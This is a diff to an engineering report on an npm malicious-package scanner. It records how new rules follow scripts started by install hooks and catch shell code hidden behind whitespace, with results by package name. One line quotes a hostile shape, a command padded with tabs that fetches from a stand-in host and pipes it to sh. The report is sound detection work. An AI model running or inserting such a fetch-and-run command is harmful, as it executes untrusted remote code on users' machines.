@@ -9,6 +9,50 @@
 > **Builds on:** agent A's `install.spawned_scripts` (`81b99d7`), [round 3](precision-round3.md)
 > (method, harness), decision [0015](../decisions/0015-reviewer-verdicts.md).
 
+## Update 2026-11-10: scripts started by scripts, Windows hook paths, padded shell code
+
+The integrator merged the first four commits (`main` `c3daf00`) and accepted
+`node-sword-interface@1.0.127` as the masking fix's cost, then asked for owner question 2 and a
+small `static.padded-code` change. Two commits, both adding findings only:
+
+| # | Commit | What | Live verdicted | Live, one day (unreviewed) | `vm-day1` malicious | Kind |
+|---|---|---|---|---|---|---|
+| C | `e96ab86` `install.script_started` (new) and `files_named` (Stage 3 install code) | a script's own starts become install code: `sh ./stage2.sh`, `. "$(dirname "$0")/lib.sh"`, `bash "$PACKAGE_DIR/sync.sh"`, `& "$PSScriptRoot\helper.ps1"`, `call %~dp0setup.bat`, `node ./lib/run.js` (then followed), 2 levels, at most 10 files; a Windows hook path (`.\scripts\x.ps1`, `node lib\index.js`) names the package file | 18 of 1,743 hooked versions get a different install set; **0 decisions change** | 2,112 hooked versions read, 10 change, **1 gains MEDIUMs**: `@raditia/craftkit@1.63.0` | **+1**: `company-ts@1.0.3`, 0 lost | **zero-loss** |
+| P | `eecbc15` `static.padded-code` v2 (Stage 2) | shell code behind a whitespace run counts as code: a tail that chains a command (`;`, `&&`) or pipes into a shell or `iex` | 0 new matches | not run (see below) | 0 new matches | **zero-loss** |
+
+- **C, live by name.** The 18 verdicted versions: `0xray` 4.1.5/4.2.0, `@codyswann/lisa@4.90.1`,
+  `@ornexus/neocortex@4.60.77`, `triflux` x5, `opencode-sesh@2.4.0`, `rvm-windows` x2,
+  `@dream-encode/wp-build-tools@0.11.0`, `electron-better-sqlite3-sqlcipher@0.2.0`,
+  `m365-api@0.1.0`, `rakumux@0.1.33`, `termux-dsh@0.2.2-rc.1-tdsh.1`,
+  `@civitas-cerebrum/achilles@0.1.8`. Their findings change in wording (more files listed as
+  changed install code; `triflux@10.90.0` loses an `install-script-code` MEDIUM because its base
+  now runs the same files) but every one is reported or unreported as before (`fdiff.py`,
+  `out/ch-*.jsonl`). The day (`daychain.py`, Stage 3's real `CODE_RULES` with `main`'s and this
+  branch's `install_sources` on each version whose sets differ): `@ornexus/neocortex` x6
+  (findings unchanged), `@jenga-ai/agent` x2 and `@sebbo2002/node-pyatv` (no severe finding
+  either way), and `@raditia/craftkit@1.63.0`, newly `npm.install-persistence` and
+  `install-script-changed` MEDIUM: its `postinstall` is `bash scripts/postinstall.sh`, which
+  runs `bash "$PACKAGE_DIR/sync.sh"`, whose adapters set `CLAUDE_COMMANDS_DIR="$HOME/.claude/
+  commands"`, `CLAUDE_AGENTS_DIR="$HOME/.claude/agents"`, `CURSOR_RULES_DIR="$HOME/.cursor/
+  rules"` and `brew install rtk`: the shape the owner rules unwanted (decision 0015 addenda).
+  Not reviewed.
+- **C, `vm-day1`.** Only 5 malicious samples can change (the 4 whose install code has a script,
+  and the one hook with a Windows path among them): `company-ts@1.0.3` (`preinstall: node
+  lib\index.js`) goes from score 2, unreported, to score 5 with `npm.install-script-code`
+  MEDIUM; the other 4 decide as before. **The 137 samples whose scripts nothing names gain
+  nothing**: 67 have no install hook at all (`auto-publish.sh` x31, `publish-helper.ps1`,
+  `inc-version.sh`), and the rest are JavaScript hooks that never start them (`esoftplay`'s
+  `bun ./bin/build.js install` x22 with `bin/test.sh`, Shai-Hulud's `node setup_bun.js` x15,
+  agent-skill scripts under `dist/skills/`). They are not install code.
+- **P.** F's scans hold every line with a run of 100+ then 200+ characters: 45 in the
+  verdicted live versions, 25 in the `vm-day1` samples F read. Every line v1 refused is a
+  table, comment or markup, which v2 still refuses, so v2 adds no match on them; it covers the
+  shape (`cd /tmp<150 tabs>; curl -s https://x/p | sh`), tested, not a measured sample. It
+  changes the Stage 2 rule-set fingerprint (a fresh content cache), nothing else.
+- **Not done:** following a script from a JavaScript-only hook that starts it through a
+  computed path (`spawn(sh, [path.join(dir, name)])` with `name` a variable); 0 positives need
+  it in the data.
+
 ## Summary
 
 | # | Commit | What | Live (3,716 verdicted): benign / positives / unverified changed | `vm-day1` malicious | Kind |
@@ -232,7 +276,7 @@ Which live versions the rules would fire on if they read JavaScript too (rejecte
    today only by `npm.install-hook` (MEDIUM, a new package with a hook). With the hook finding
    LOW it stays reported only through this rule (`ifhook.py`); the other 7 keep another
    MEDIUM. Worth checking against B's final shape.
-2. **Two gaps in `install.py` this agent didn't touch** (existing functions, not mine): a
+2. **Two gaps in `install.py`** (closed by commit C, see the update above) (existing functions, not mine): a
    script another script starts is not read (`spawned_scripts` doesn't follow scripts; 137
    `vm-day1` malicious samples ship a `.sh`/`.ps1`/`.bat` that no hook or install code names
    by a constant path), and a Windows hook path `.\scripts\x.ps1` is not resolved
